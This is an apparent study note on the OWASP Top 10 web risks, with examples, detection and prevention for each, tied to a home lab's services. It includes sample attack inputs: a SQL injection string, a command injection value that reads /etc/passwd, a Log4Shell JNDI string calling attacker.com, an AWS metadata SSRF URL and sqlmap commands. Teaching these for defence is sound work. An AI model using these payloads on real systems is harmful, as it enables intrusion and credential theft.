# Web Security — OWASP Top 10 and Beyond
> Web apps are the #1 attack surface. If you're on help desk, you're clicking on web apps all day — and so are the attackers.

Web security matters even for sysadmins: your admin panels, monitoring dashboards, [[Semaphore]], [[Portainer]], [[Grafana]], and [[Wazuh]] are all web apps. They all need hardening.

---

## OWASP Top 10 — 2021 Edition

### A01 — Broken Access Control (Most Common)
**What it is:** Users can access data/functions they shouldn't be able to.

**Examples:**
- IDOR (Insecure Direct Object Reference): `/api/invoice/1234` → change to `/api/invoice/1235` → someone else's invoice
- Horizontal privilege escalation: normal user accessing another user's account
- Vertical privilege escalation: normal user accessing admin functions
- CORS misconfiguration allowing any origin to read sensitive responses

**Real example:** In 2021, an API exposed at `/api/users/<id>` returned all user data without checking if the requester was that user. Automated scraping exposed millions of accounts.

**Detection:**
- Access logs showing sequential ID enumeration
- Failed access attempts across multiple accounts
- Unexpected admin endpoint access from non-admin users

**Prevention:**
- Deny by default — every resource needs explicit authorization
- Server-side access checks on every request (not just UI hiding)
- Log all access control failures, alert on volume

---

### A02 — Cryptographic Failures
**What it is:** Sensitive data exposed because of weak/missing encryption.

**Examples:**
- Passwords stored in MD5 or SHA1 (crackable in seconds)
- HTTP instead of HTTPS (credentials in plaintext)
- TLS 1.0/1.1 still accepted (BEAST, POODLE attacks)
- Encryption keys hardcoded in source code
- JWT with `alg: none` (no signature = anyone can forge tokens)
- Sensitive data in URL parameters (logged by servers, browsers, proxies)

**Real example:** RockYou (2009) — 32M passwords stored in plaintext. Still used as the canonical wordlist in password cracking today.

**Prevention:**
- HTTPS everywhere, TLS 1.2+ minimum, TLS 1.3 preferred
- Passwords: bcrypt, Argon2, or scrypt (never MD5/SHA1/SHA256 bare)
- No sensitive data in URLs — use POST with body or headers
- Automated secret scanning in CI/CD (GitLeaks, truffleHog)

---

### A03 — Injection
**What it is:** Untrusted data sent to an interpreter as part of a command or query.

#### SQL Injection
Classic example:
```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Attacker input: username = ' OR '1'='1
-- Resulting query (always true):
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
```
**Tools:** sqlmap (`sqlmap -u "http://target/page?id=1" --dbs`)
**Prevention:** Parameterized queries / prepared statements — *always*

#### Command Injection
```bash
# Vulnerable code (Python)
import os
os.system("ping " + user_input)

# Attacker input: "127.0.0.1; cat /etc/passwd"
```
**Prevention:** Never pass user input to shell. Use subprocess with argument lists.

#### Cross-Site Scripting (XSS)
**Stored XSS:** Malicious script saved in DB → served to all users
**Reflected XSS:** Script in URL parameter → reflected in response
**DOM XSS:** Client-side JS processes attacker input without sanitization

Real impact: Session hijacking, credential theft, keyloggers, crypto mining
**Prevention:** Output encoding, Content Security Policy (CSP), HttpOnly cookies

---

### A04 — Insecure Design
**What it is:** Missing or flawed security controls in the design itself — not implementation bugs.

**Examples:**
- No rate limiting on login → brute force trivially possible
- Password reset allows enumeration (different error for valid vs invalid user)
- Business logic flaws: buy an item with negative quantity → get money back
- Trusting client-side validation only

**Real example:** A major retailer let users modify item prices in cart requests. No server-side price validation = free shopping.

**Prevention:** Threat modeling before building, security requirements in design phase, abuse case testing

---

### A05 — Security Misconfiguration
**What it is:** Default credentials, unnecessary features enabled, error messages with too much detail.

**Examples:**
- Default creds on admin panels (admin/admin, admin/password)
- Exposed `phpinfo()`, stack traces in 500 errors, directory listing
- Cloud storage buckets with public read access (S3, Azure Blob)
- Unnecessary ports/services open
- Missing security headers (CSP, HSTS, X-Frame-Options)

**COCYTUS Relevance:** Every new web service deployed ([[Portainer]], [[Grafana]], [[Semaphore]]) must have:
- Default credentials changed immediately
- Service only exposed on appropriate interface
- Access controlled by [[UFW]] or [[Tailscale]] ACLs

**Prevention:** Hardening checklists, automated configuration scanning (Lynis, OpenSCAP), disable debug mode in prod

---

### A06 — Vulnerable and Outdated Components
**What it is:** Using libraries, frameworks, or software with known vulnerabilities.

**Examples:**
- Log4Shell (CVE-2021-44228) — Log4j library in millions of Java apps
- Apache Struts RCE (Equifax breach, 2017) — known vuln for 2 months before breach
- Unpatched WordPress plugins (most common website compromise vector)

**Log4Shell was so severe because:** It was in Log4j, a logging library used by virtually every Java application. The vulnerability was trivially exploitable — just send the string `${jndi:ldap://attacker.com/exploit}` in *any* user input that gets logged.

**Prevention:**
- Dependency scanning in CI/CD (Dependabot, Snyk, OWASP Dependency-Check)
- Regular patching (this is why COCYTUS runs [[Semaphore]] apt-upgrade.yml Mon/Thu)
- Software Bill of Materials (SBOM) for your own software

---

### A07 — Identification and Authentication Failures
**What it is:** Flaws in how users are identified and authenticated.

**Examples:**
- No lockout on failed logins → brute force
- Credential stuffing: using username:password pairs from previous breaches
- Session IDs in URLs, session fixation
- Weak password requirements
- No MFA on critical functions

**Credential stuffing vs brute force:**
- Brute force: try all combinations → obvious, triggers lockouts
- Credential stuffing: use real username:password from past breaches → stealthy, valid credentials

**Prevention:** MFA everywhere, breached password detection (HaveIBeenPwned API), account lockout with progressive delays, session management hardening

---

### A08 — Software and Data Integrity Failures
**What it is:** Code and infrastructure that doesn't protect against integrity violations.

**Examples:**
- Insecure deserialization → arbitrary code execution
- Auto-update mechanisms without signature verification
- CI/CD pipeline compromise (SolarWinds was this: trojanized build output)
- Plugins/libraries from untrusted CDNs

**Supply chain significance:** If the build process is compromised, the signed software is the attack. Signature verification only proves it came from the (now compromised) build system.

**Prevention:** Digital signature verification for all packages/updates, immutable build environments, integrity checking for CI/CD

---

### A09 — Security Logging and Monitoring Failures
**What it is:** Insufficient logging means attacks go undetected.

**Real example:** Average dwell time before detection is 197 days (SANS DBIR). Without logs, you can't even tell when it started.

**What should be logged:**
- All authentication events (success AND failure)
- All authorization failures
- All administrative actions
- All high-value transactions
- Input validation failures (could indicate scanning)

**What's wrong with most logging:**
- Logs only capture errors, not successful operations
- No centralized log collection (SIEM)
- Logs not monitored in real-time
- Logs stored on the same system being attacked (attacker deletes them)

**COCYTUS:** This is why [[Wazuh]] is deployed — agents ship logs to central manager on [[LAB_HOST]], attackers can't delete forwarded logs.

**Prevention:** Centralized logging ([[Splunk]], Elastic, [[Wazuh]]), alerting on suspicious patterns, log integrity (WORM storage)

---

### A10 — Server-Side Request Forgery (SSRF)
**What it is:** Web app fetches a URL supplied by attacker → can reach internal services.

**Attack scenario:**
1. Web app has "import from URL" feature
2. Attacker provides: `http://169.254.169.254/latest/meta-data/` (AWS metadata service)
3. App fetches it and returns cloud credentials to attacker
4. Attacker has full AWS access

**Prevention:**
- Validate and whitelist allowed URL schemes and hostnames
- Block RFC1918 (private IP) ranges in requests
- Network segmentation — app server can't reach backend services directly
- AWS IMDSv2 (requires token — mitigates simple SSRF)

---

## Tools

| Tool | Purpose | Notes |
|---|---|---|
| **[[Burp Suite]]** | Web proxy, scanner, manual testing | Industry standard for web pentesting |
| **OWASP ZAP** | Free Burp alternative, automated scanning | Good for CI/CD integration |
| **Nikto** | Web server scanner | Quick win check for common misconfigs |
| **sqlmap** | Automated SQL injection detection and exploitation | `sqlmap -u URL --forms` for basic test |
| **ffuf / gobuster** | Directory/subdomain fuzzing | Find hidden admin panels, backup files |
| **Wapiti** | Black-box web app scanner | Open source, decent coverage |

---

## Tags
`#web-security` `#owasp` `#appsec` `#injection` `#xss` `#sqli`

[[Burp Suite]] [[MITRE ATT&CK]] [[Incident Response]] [[CySA+]] [[Portainer]] [[Grafana]] [[Semaphore]]